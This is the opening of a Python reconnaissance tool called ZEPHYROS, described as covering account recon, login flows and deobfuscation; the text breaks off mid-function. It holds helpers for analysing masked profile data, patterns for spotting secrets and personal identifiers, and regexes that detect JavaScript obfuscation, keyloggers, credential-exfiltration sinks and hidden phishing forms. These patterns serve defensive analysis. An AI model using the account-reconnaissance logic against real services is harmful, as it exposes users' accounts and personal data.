#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import binascii
import codecs
import difflib
import getpass
import hashlib
import html as _html_mod
import ipaddress
import json
import math
import os
import re
import shutil
import signal
import socket
import stat
import string
import statistics
import subprocess
import sys
import tempfile
import time
import traceback
import urllib.parse
import warnings
import zlib
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Iterable, List, Literal, Optional, Sequence, Tuple
from urllib.parse import urljoin, urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[FATAL] requests required: pip install requests", file=sys.stderr)
    sys.exit(1)

try:
    import importlib.metadata as _md
except ImportError:
    _md = None

try:
    import dns.resolver as _dns
    _DNS_AVAILABLE = True
except ImportError:
    _dns = None
    _DNS_AVAILABLE = False

warnings.filterwarnings("ignore", category=UserWarning, module="getpass")

VERSION = "1.0.0"
ZEPHYR_AUTHOR = "SYLHETYHACKVENGER (THE-ERROR808)"

EXIT_OK = 0
EXIT_ERROR = 1
EXIT_GUARD = 2
EXIT_AUTH_REFUSED = 3
EXIT_SCOPE = 4
EXIT_INTERRUPT = 5
EXIT_NO_TARGET = 6

DEFAULT_MASK_SYMBOLS = frozenset("*•●#▪■□▫◾◽◼◻⦁⋯…")
MASK_SYMBOLS: set = set(DEFAULT_MASK_SYMBOLS)
SPECIAL_MASK_SYMBOLS = frozenset("*•●▪■□▫◾◽◼◻⦁⋯…")
MASK_CHARS_STR = "".join(sorted(DEFAULT_MASK_SYMBOLS))
MASK_CHARS_CLASS = "".join(re.escape(c) for c in MASK_CHARS_STR)

GENERIC_REDACTIONS = frozenset({
    "user", "redacted", "hidden", "private", "masked", "null", "none",
    "unknown", "restricted", "protected", "anonymous", "guest", "deleted",
    "n/a", "na", "-", "—",
})

ALLOWED_PROFILE_FIELDS = frozenset({
    "id", "user_id", "uid", "account_id", "uuid",
    "name", "full_name", "fullname", "display_name", "displayname",
    "username", "user_name", "login", "login_name", "handle", "nickname",
    "email", "e_mail", "mail", "email_address", "primary_email",
    "phone", "mobile", "phone_number", "mobile_number", "telephone", "tel",
    "number", "contact", "contact_number", "msisdn",
    "first_name", "firstname", "given_name", "last_name", "lastname",
    "surname", "family_name",
    "bio", "about", "description", "location", "website", "url",
    "avatar", "avatar_url", "profile_picture", "picture",
    "created_at", "joined_at", "registered_at", "updated_at",
    "public", "is_public", "private", "is_private", "visibility",
    "verified", "is_verified", "followers", "following",
    "posts", "reputation", "role", "account_type", "status",
})

FIELD_TYPE_HINTS = {
    "email": {"email", "e_mail", "mail", "email_address", "primary_email"},
    "phone": {"phone", "mobile", "phone_number", "mobile_number",
              "telephone", "tel", "number", "contact_number", "msisdn"},
    "name": {"name", "full_name", "fullname", "display_name", "displayname",
             "first_name", "firstname", "given_name", "last_name",
             "lastname", "surname", "family_name"},
    "username": {"username", "user_name", "login", "login_name", "handle",
                 "nickname"},
    "id": {"id", "user_id", "uid", "account_id", "uuid"},
    "visibility": {"public", "is_public", "private", "is_private",
                    "visibility", "account_type"},
}

BASE_DICTIONARY = frozenset({
    "hello", "world", "admin", "administrator", "user", "test", "demo",
    "john", "jane", "alice", "bob", "michael", "david", "sarah", "emma",
    "rahim", "karim", "rahman", "hasan", "hossain", "islam", "dhaka",
    "bangladesh", "contact", "email", "name", "login", "password",
    "account", "profile", "smith", "jones", "brown", "williams", "garcia",
    "miller", "davis", "rodriguez", "martinez", "hernandez", "lopez",
    "gonzalez", "wilson", "anderson", "thomas", "taylor", "moore",
    "jackson", "martin", "lee", "perez", "thompson", "white", "harris",
    "sanchez", "clark", "ramirez", "lewis", "robinson", "walker", "young",
    "allen", "king", "wright", "scott", "torres", "nguyen", "hill",
    "flores", "green", "adams", "nelson", "baker", "hall", "rivera",
    "campbell", "mitchell", "carter", "roberts",
})

COMMON_WORDS = frozenset({
    "the", "and", "you", "for", "that", "with", "this", "have", "from",
    "not", "are", "was", "but", "his", "her", "they", "all", "can",
    "will", "one", "two", "our", "out", "who", "get", "use", "man",
    "new", "now", "way", "may", "say", "see", "him", "how",
    "its", "old", "any", "day", "too", "she",
})

DEFAULT_WORD_PRIORS = {
    "john": 5.0, "jane": 4.0, "alice": 3.0, "bob": 3.0, "michael": 4.5,
    "david": 4.0, "sarah": 3.5, "emma": 3.0, "admin": 2.0, "user": 2.0,
    "test": 1.5, "smith": 5.0, "jones": 4.0, "brown": 3.5, "williams": 3.0,
    "gmail": 8.0, "yahoo": 5.0, "outlook": 4.0, "hotmail": 3.0,
    "rahim": 3.0, "karim": 3.0, "rahman": 3.0, "hasan": 3.0,
    "hossain": 3.0, "islam": 3.0, "dhaka": 3.0, "bangladesh": 3.0,
}

EMAIL_DOMAIN_LENGTH_PRIORS = {
    "gmail.com": (8.2, 3.4), "yahoo.com": (7.6, 3.2),
    "outlook.com": (8.0, 3.3), "hotmail.com": (7.8, 3.2),
    "protonmail.com": (7.5, 3.1), "icloud.com": (7.4, 3.0),
    "aol.com": (6.8, 2.9), "gov": (6.5, 2.7), "edu": (6.0, 2.5),
}

COUNTRY_CODES = {
    "US": "+1", "CA": "+1", "GB": "+44", "UK": "+44",
    "AU": "+61", "NZ": "+64", "IE": "+353",
    "DE": "+49", "FR": "+33", "IT": "+39", "ES": "+34", "PT": "+351",
    "NL": "+31", "BE": "+32", "CH": "+41", "AT": "+43",
    "SE": "+46", "NO": "+47", "DK": "+45", "FI": "+358",
    "PL": "+48", "CZ": "+420", "GR": "+30", "HU": "+36",
    "RO": "+40", "BG": "+359", "HR": "+385", "RS": "+381",
    "RU": "+7", "UA": "+380", "TR": "+90",
    "SA": "+966", "AE": "+971", "QA": "+974", "KW": "+965",
    "BH": "+973", "OM": "+968", "JO": "+962", "LB": "+961",
    "EG": "+20", "MA": "+212", "TN": "+216", "DZ": "+213",
    "ZA": "+27", "NG": "+234", "KE": "+254", "GH": "+233",
    "ET": "+251", "TZ": "+255", "UG": "+256",
    "IN": "+91", "PK": "+92", "BD": "+880", "LK": "+94",
    "NP": "+977", "MM": "+95", "TH": "+66", "VN": "+84",
    "KH": "+855", "LA": "+856", "MY": "+60", "SG": "+65",
    "ID": "+62", "PH": "+63", "BN": "+673",
    "CN": "+86", "JP": "+81", "KR": "+82", "TW": "+886",
    "HK": "+852", "MO": "+853", "MN": "+976",
    "BR": "+55", "MX": "+52", "AR": "+54", "CL": "+56",
    "CO": "+57", "PE": "+51", "VE": "+58", "EC": "+593",
    "BO": "+591", "UY": "+598", "PY": "+595",
}

TECHNIQUE_NAMES = {
    "partial_masking": "Partial masking",
    "format_preserving_masking": "Format-preserving masking",
    "fixed_width_padding_masking": "Fixed-width padding masking",
    "full_redaction": "Full redaction / nulling out",
    "empty_value": "Empty value",
    "tokenization_or_pseudonymization": "Tokenization or pseudonymization",
    "key_material": "API key / session token",
    "generalization_or_binning": "Generalization / quantile binning",
    "character_scrambling_or_generative": "Character scrambling / generative",
    "unknown_or_plaintext": "Unknown / possibly plaintext",
    "structured_identifier_luhn": "Structured identifier (Luhn)",
    "structured_identifier_iban": "Structured identifier (IBAN)",
    "structured_identifier_ssn_us": "Structured identifier (SSN)",
    "structured_identifier_aadhaar": "Structured identifier (Aadhaar)",
    "login_field_required": "Login field requirement",
    "login_obfuscated_response": "Login response obfuscation",
    "forgot_password_obfuscated": "Forgot-password response obfuscation",
    "account_visibility_public": "Account visibility: public",
    "account_visibility_private": "Account visibility: private",
    "account_id_type_numeric": "Account ID: numeric",
    "account_id_type_alpha": "Account ID: alphabetic",
    "account_id_type_mixed": "Account ID: mixed",
}

TOKEN_LIKE = re.compile(
    r"^(?:[A-Fa-f0-9]{8}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{4}-"
    r"[A-Fa-f0-9]{4}-[A-Fa-f0-9]{12}|"
    r"(?=.*[0-9])(?=.*[A-Za-z_\-])[A-Za-z0-9_\-]{20,})$"
)
BINNED_VALUE = re.compile(
    r"^(?:\[[^\]]+\]|<\s*\d+|\d+\s*\+|\d+\s*-\s*\d+|range:.+)$",
    re.IGNORECASE,
)
API_KEY_HINTS = re.compile(
    r"(?:api[_\-]?key|secret|bearer|token|session[_\-]?id|csrf|xsrf)",
    re.IGNORECASE,
)
CRYPTO_MARKERS = {
    "zkp": ["pi_a", "pi_b", "pi_c", "groth16", "bulletproof", "commitment",
            "nullifier", "verifier_key"],
    "homomorphic": ["ciphertext", "paillier", "seal", "bfv", "ckks",
                    "eval_key", "relin_key"],
    "smpc": ["party_id", "mpc_commit", "mpc_open"],
}
CRYPTO_FALSE_POSITIVE = re.compile(
    r"(?:captcha|csrf|xsrf|oauth|challenge[_\-]?response)",
    re.IGNORECASE,
)
ID_STRUCTURES = {
    "luhn": re.compile(r"^\d{13,19}$"),
    "iban": re.compile(r"^[A-Z]{2}\d{2}[A-Z0-9]{11,30}$"),
    "ssn_us": re.compile(r"^\d{3}-\d{2}-\d{4}$"),
    "aadhaar": re.compile(r"^\d{4}\s?\d{4}\s?\d{4}$"),
}
MASK_RUN = re.compile(f"[{MASK_CHARS_CLASS}]+")
MASK_SKELETON = re.compile(
    f"([^{MASK_CHARS_CLASS}\\s]+)|([{MASK_CHARS_CLASS}]+)"
)
SENSITIVE_VALUE_KEYS = re.compile(
    r"(?:access[_-]?token|refresh[_-]?token|id[_-]?token|"
    r"api[_-]?key|private[_-]?key|public[_-]?key|secret|"
    r"session[_-]?id|cookie|set[_-]?cookie|bearer|"
    r"password|passwd|passphrase|pwd|"
    r"csrf|xsrf|jwt|otp|mfa[_-]?token|recovery[_-]?code|"
    r"client[_-]?secret|authorization)",
    re.IGNORECASE,
)
EMBEDDED_TOKEN_PATTERNS = re.compile(
    r"Bearer\s+[A-Za-z0-9_\-\.]+|"
    r"eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}|"
    r"AKIA[0-9A-Z]{16}|"
    r"sk_live_[A-Za-z0-9]{20,}|"
    r"ghp_[A-Za-z0-9]{36}"
)
EMAIL_PATTERN = re.compile(r"^[^@\s]+@[^@\s]+\.[A-Za-z]{2,}$")
PHONE_PATTERN = re.compile(r"^\+?[\d\s\-\(\)\.]{7,20}$")
MASK_LEAK_PATTERN = re.compile(rf"[{MASK_CHARS_CLASS}]{{2,}}")

SCRIPT_TAG_RE = re.compile(
    r"<script\b([^>]*)>([\s\S]*?)</script\s*>", re.IGNORECASE)
SCRIPT_SRC_RE = re.compile(r"\bsrc\s*=\s*(['\"])([^'\"]+)\1",
                           re.IGNORECASE)
DATA_URI_RE = re.compile(
    r"data:([a-zA-Z0-9._-]+/[a-zA-Z0-9._-]+);base64,([A-Za-z0-9+/=]+)")
JS_URI_RE = re.compile(r"javascript:([^'\"\s>]+)", re.IGNORECASE)
META_REFRESH_RE = re.compile(
    r"<meta[^>]+http-equiv\s*=\s*['\"]refresh['\"][^>]*"
    r"content\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)
HTML_COMMENT_RE = re.compile(r"<!--([\s\S]*?)-->")

UNICODE_ESCAPE_RE = re.compile(r"\\u([0-9a-fA-F]{4})")
HEX_ESCAPE_RE = re.compile(r"\\x([0-9a-fA-F]{2})")
OCTAL_ESCAPE_RE = re.compile(r"\\([0-7]{1,3})")
HTML_ENTITY_RE = re.compile(r"&#(?:x([0-9a-fA-F]+)|(\d+));")
JS_ESCAPE_SEQ = re.compile(r"\\([nrtbfv0'\"\\])")
JS_ESCAPE_MAP = {"n": "\n", "r": "\r", "t": "\t", "b": "\b",
                 "f": "\f", "v": "\v", "0": "\0", "'": "'",
                 '"': '"', "\\": "\\"}

ARRAY_DEF_RE = re.compile(
    r"(?:var|let|const)\s+(_0x[a-fA-F0-9]+)\s*=\s*\[")
ROTATION_IIFE_RE = re.compile(
    r"\(function\s*\(\s*([A-Za-z_$][\w$]*)\s*,\s*([A-Za-z_$][\w$]*)\s*\)"
    r"\s*\{\s*var\s+([A-Za-z_$][\w$]*)\s*=\s*function\s*\(\s*([A-Za-z_$][\w$]*)"
    r"\s*\)\s*\{\s*while\s*\(\s*--\s*\4\s*\)\s*\{\s*\1\s*\[\s*['\"]push['\"]\s*\]"
    r"\s*\(\s*\1\s*\[\s*['\"]shift['\"]\s*\]\s*\(\s*\)\s*\)\s*;?\s*\}\s*\}\s*;"
    r"\s*\3\s*\(\s*\+\+\s*\2\s*\)\s*;?\s*\}\s*\(\s*\1\s*,\s*(0x[0-9a-fA-F]+|\d+)"
    r"\s*\)\s*\)"
)
STRING_LOOKUP_RE = re.compile(
    r"(?:var|let|const)\s+([A-Za-z_$][\w$]*)\s*=\s*function\s*"
    r"\(\s*([A-Za-z_$][\w$]*)\s*,\s*([A-Za-z_$][\w$]*)\s*\)\s*\{"
    r"[\s\S]{0,200}?return\s+([A-Za-z_$][\w$]*)\s*\[\s*\2\s*\]")
ARRAY_LOOKUP_CALL_RE = re.compile(
    r"\b([A-Za-z_$][\w$]*)\s*\(\s*(0x[0-9a-fA-F]+|\d+)\s*\)")
PACKER_RE = re.compile(
    r"eval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e\s*,\s*"
    r"[dr]\s*\)\s*\{[\s\S]{0,4000}?\}\s*\(\s*"
    r"(['\"])([\s\S]+?)\1\s*,\s*(\d+)\s*,\s*(\d+)\s*,\s*"
    r"(['\"])([\s\S]+?)\5\s*\.\s*split\s*\(\s*['\"]\|\s*['\"]\s*\)"
    r"\s*,\s*(\d+)\s*,\s*\{\s*\}\s*\)\s*\)")
PACKER_BASE62 = (
    "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
EVAL_LITERAL_RE = re.compile(
    r"\beval\s*\(\s*(['\"])([\s\S]{40,}?)\1\s*\)")
NEW_FUNCTION_RE = re.compile(
    r"\b(?:new\s+)?Function\s*\(\s*(['\"])([\s\S]{40,}?)\1\s*\)")
CONCAT_LITERAL_RE = re.compile(
    r"(['\"])([^'\"\\]*(?:\\.[^'\"\\]*)*)\1\s*\+\s*"
    r"(['\"])([^'\"\\]*(?:\\.[^'\"\\]*)*)\3")
CONTROL_FLOW_RE = re.compile(
    r"var\s+([A-Za-z_$][\w$]*)\s*=\s*(['\"])([0-9|]+)\2\s*"
    r"\[\s*['\"]split['\"]\s*\]\s*\(\s*['\"]\|['\"]\s*\)\s*,\s*"
    r"([A-Za-z_$][\w$]*)\s*=\s*0x0\s*;")
DEAD_VAR_RE = re.compile(
    r"(?:var|let)\s+([A-Za-z_$][\w$]*)\s*=\s*[^;]{1,200}?;")

CRED_FIELD_RE = re.compile(
    r"\b(?:password|passwd|pwd|credit[\s_-]?card|card[\s_-]?number|"
    r"cvv|cvc|ssn|pin|otp|mfa|2fa|security[\s_-]?code)\b",
    re.IGNORECASE,
)
EXFIL_SINK_RE = re.compile(
    r"XMLHttpRequest|fetch\s*\(|\.send\s*\(|navigator\.sendBeacon|"
    r"new\s+Image\s*\(|\.ajax\s*\(|\.post\s*\(")
KEYBOARD_LISTENER_RE = re.compile(
    r"addEventListener\s*\(\s*['\"](?:keydown|keyup|keypress)['\"]|"
    r"onkeydown\s*=|onkeyup\s*=|onkeypress\s*=")
INPUT_READ_RE = re.compile(
    r"\.(?:value|valueAsNumber|valueAsDate)\b|"
    r"FormData\s*\(|\.elements\s*\[|querySelector(?:All)?\s*\(")
MUTATION_RE = re.compile(r"MutationObserver|beforeunload|unload")
BEACON_RE = re.compile(
    r"sendBeacon|new\s+Image\s*\(\s*\)|\.src\s*=\s*['\"]https?://")
PHISHING_FORM_RE = re.compile(
    r"<form\b([^>]*)>(.*?)</form\s*>", re.IGNORECASE | re.DOTALL)
PHISHING_ACTION_RE = re.compile(
    r"\baction\s*=\s*(['\"])([^'\"]+)\1", re.IGNORECASE)
PHISHING_METHOD_RE = re.compile(
    r"\bmethod\s*=\s*(['\"])([^'\"]+)\1", re.IGNORECASE)
HIDDEN_STYLE_RE = re.compile(
    r"style\s*=\s*['\"][^'\"]*(?:display\s*:\s*none|"
    r"visibility\s*:\s*hidden|opacity\s*:\s*0)", re.IGNORECASE)
HIDDEN_CLASS_RE = re.compile(
    r"\bclass\s*=\s*['\"][^'\"]*(?:hidden|hide|invisible|sr-only|"
    r"d-none)[^'\"]*['\"]", re.IGNORECASE)

PUBLIC_ID_KEYS = re.compile(
    r"^(?:id|user_?id|uid|account_?id|uuid|public_?id)$",
    re.IGNORECASE)
VISIBILITY_KEYS = re.compile(
    r"(?:private|is_private|public|is_public|visibility|account_type|"
    r"profile_type|profile_visibility)", re.IGNORECASE)
PRIVATE_TRUE_VALUES = frozenset({"true", "1", "yes", "private",
                                  "protected", "friends", "followers"})
PUBLIC_TRUE_VALUES = frozenset({"true", "1", "yes", "public", "open",
                                 "everyone", "anyone"})
LOGIN_FIELD_KEYS_RE = re.compile(
    r"\b(?:required|field|fields|missing|must|need|provide|"
    r"invalid|error|message|detail|reason)\b", re.IGNORECASE)
BASELINE_RANDOM_PREFIX = "n0n3x1st_"

_BANNER_ART = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠖⠃⠀⠀⠀⡁⠀⠀⠀⠀⠀⠐⠆⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢔⡤⠊⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠁⠀⠀⠘⠁⢀⠀⠀⠀⠀⢈⠓⠂⠠⡄⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠿⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠁⠀⠠⡚⠁⢀⣙⣀⣈⡩⠬⢁⠀⢑⠶⠤⡆⠤⡀⠀⠀⠀⠀⠀⠀⢀⠴⢲⣋⣽⣷⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⢠⠀⠀⣶⠃⠗⣡⣶⣮⣿⡿⠿⠿⢿⣿⣷⣶⣤⣤⠤⠴⠦⠬⣤⣤⠄⣉⠉⠝⢲⣿⡷⠻⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠁⡀⡸⠁⣰⣿⡿⠛⠋⣁⡀⠤⠤⢄⡀⠈⠛⢯⣿⣟⣾⣶⣶⣮⣭⣵⣾⣿⣟⠿⠉⢨⠖⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⢠⠳⡧⣻⡿⠋⢀⠒⠉⠀⠀⠀⠀⠀⠀⠉⠢⠀⠀⠙⠛⣻⣿⣿⣿⢿⣿⣿⠟⡱⠖⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢠⣧⠓⣾⣿⠁⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢦⣠⣾⣿⠿⣿⣿⣿⡿⣫⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠂⢃⣸⣿⠇⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⠟⢿⠁⠸⡿⣿⣯⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢘⡄⠘⣿⣿⠀⠸⡀⠀⠀⠀⠀⠀⢀⣀⣴⣾⣿⡿⡟⡋⠐⡇⠀⢸⣿⣿⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⠘⢰⣿⡿⡆⠀⣇⠀⣀⣠⣤⣶⣿⢷⢟⠻⠀⠈⠀⠀⠀⡇⠀⣼⣿⣿⠂⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⢀⡴⢯⣾⠟⡏⢀⣠⣿⣿⣿⣟⢟⡋⠅⠘⠉⠀⠀⠀⠀⢀⠀⠁⢠⣿⣟⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⣻⣷⡿⢙⣩⣶⡿⠿⠛⠉⠑⢡⡁⠀⠀⠀⠀⠀⠀⢀⠔⠁⠀⣰⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣡⣾⣥⣾⢫⡦⠾⠛⠙⠉⠀⠀⢀⣀⠀⠈⠙⠓⠦⠤⠤⠀⠘⠁⢀⡤⣾⡿⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠔⣴⣾⣿⣿⢟⢝⠢⠃⢀⣤⢴⣾⣮⣷⣶⢿⣶⡤⣐⡀⠀⣠⣤⢶⣪⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡀⣦⣾⡿⡛⠵⠺⢈⡠⠶⠿⠥⠥⡭⠉⠉⢱⡛⠻⠿⣿⣿⣿⣿⣿⠿⠿⠿⠟⠭⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⢴⠕⣋⠝⠕⠐⠀⠔⠉⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠉⠁⠁⠁⠁⠈⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣠⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

_ANSI_RESET = "\033[0m"
_NEON_CYAN = "\033[38;5;51m"
_NEON_MAGENTA = "\033[38;5;201m"
_NEON_PURPLE = "\033[38;5;135m"
_NEON_BLUE = "\033[38;5;45m"
_NEON_GREEN = "\033[38;5;46m"
_DIM = "\033[2m"
_BOLD = "\033[1m"


def _terminal_width(default: int = 100) -> int:
    try:
        return max(40, min(shutil.get_terminal_size((default, 24)).columns,
                          default))
    except Exception:
        return default


def _supports_color(stream) -> bool:
    try:
        if os.environ.get("NO_COLOR"):
            return False
        if os.environ.get("FORCE_COLOR"):
            return True
        return bool(getattr(stream, "isatty", lambda: False)())
    except Exception:
        return False


def _centre_pad(text: str, width: int) -> str:
    stripped = re.sub(r"\033\[[0-9;]*m", "", text)
    pad = max(0, (width - len(stripped)) // 2)
    return (" " * pad) + text


def render_banner(stream=sys.stdout, color: Optional[bool] = None) -> None:
    width = _terminal_width()
    use_color = _supports_color(stream) if color is None else color
    art_lines = _BANNER_ART.strip("\n").split("\n")

    def paint(s: str, code: str) -> str:
        return f"{code}{s}{_ANSI_RESET}" if use_color else s

    print(file=stream)
    for line in art_lines:
        print(_centre_pad(paint(line, _NEON_CYAN), width), file=stream)

    title = "Z E P H Y R O S"
    subtitle = "account recon  ·  login flow  ·  deobfuscation"
    credit = f"by {ZEPHYR_AUTHOR}"

    if use_color:
        title = _centre_pad(paint(title, _BOLD + _NEON_MAGENTA), width)
        subtitle = _centre_pad(paint(subtitle, _NEON_PURPLE), width)
        credit = _centre_pad(paint(credit, _NEON_BLUE), width)
    else:
        title = _centre_pad(title, width)
        subtitle = _centre_pad(subtitle, width)
        credit = _centre_pad(credit, width)

    print(file=stream)
    print(title, file=stream)
    print(subtitle, file=stream)
    print(credit, file=stream)

    if use_color:
        divider = "─" * min(width - 4, 72)
        divider = _centre_pad(f"{_NEON_GREEN}{divider}{_ANSI_RESET}", width)
    else:
        divider = _centre_pad("─" * min(width - 4, 72), width)
    print(divider, file=stream)
    print(file=stream)


class GuardTriggeredError(Exception):
    pass


class LabToolError(Exception):
    pass


class AuthorizationRequiredError(Exception):
    pass


class ScopeViolationError(Exception):
    pass


class AuthRefusedError(Exception):
    pass


class IdentifierError(Exception):
    pass


def utcnow() -> str:
    return datetime.now(timezone.utc).isoformat()


def clamp(v: float, lo: float = 0.0, hi: float = 1.0) -> float:
    return max(lo, min(hi, v))


def shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    counts = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def printable_ratio(text: str) -> float:
    if not text:
        return 0.0
    good = sum(1 for c in text if c.isprintable() or c in "\n\r\t")
    return good / len(text)


def looks_like_api_key(v: str) -> bool:
    return bool(API_KEY_HINTS.search(v)) and len(v) >= 16


def has_mask(v: str) -> bool:
    return any(c in MASK_SYMBOLS for c in v)


def has_special_mask(v: str) -> bool:
    return any(c in SPECIAL_MASK_SYMBOLS for c in v)


def has_mask_leak(v: str) -> bool:
    return bool(MASK_LEAK_PATTERN.search(v))


def mask_skeleton(v: str) -> str:
    out = []
    for match in MASK_SKELETON.finditer(v):
        if match.group(1):
            out.append("V")
        else:
            out.append(f"M{len(match.group(2))}")
    return "".join(out)


def redact_url_for_log(url: str) -> str:
    try:
        p = urlparse(url)
        if not p.query:
            return url
        return f"{p.scheme}://{p.netloc}{p.path}?<redacted>"
    except Exception:
        return "<unparseable-url>"


def redact_string(s: str) -> str:
    return EMBEDDED_TOKEN_PATTERNS.sub("<redacted>", s)


def normalize_base_url(v: str) -> str:
    v = v.strip()
    if not v:
        raise ValueError("empty URL")
    if not urlparse(v).scheme:
        v = "https://" + v
    p = urlparse(v)
    if not p.netloc:
        raise ValueError("invalid URL")
    return f"{p.scheme}://{p.netloc}"


def normalize_field_name(name: str) -> str:
    n = name.lower().strip()
    if n in ALLOWED_PROFILE_FIELDS:
        return n
    if n.endswith("es") and n[:-2] in ALLOWED_PROFILE_FIELDS:
        return n[:-2]
    if n.endswith("s") and n[:-1] in ALLOWED_PROFILE_FIELDS:
        return n[:-1]
    return n


def detect_identifier_type(raw: str) -> str:
    s = raw.strip()
    if not s:
        return "unknown"
    if EMAIL_PATTERN.match(s):
        return "email"
    if PHONE_PATTERN.match(s) and sum(c.isdigit() for c in s) >= 7:
        return "phone"
    return "username"


def normalize_phone(raw: str, country_hint: str = "") -> Optional[str]:
    s = re.sub(r"[^\d+]", "", raw)
    if not s:
        return None
    if s.startswith("+"):
        return s if len(s) >= 8 else None
    for cc in COUNTRY_CODES.values():
        digits = cc.lstrip("+")
        if s.startswith(digits) and len(s) > len(digits) + 5:
            return "+" + s
    if country_hint:
        hint = country_hint.strip()
        if hint.upper() in COUNTRY_CODES:
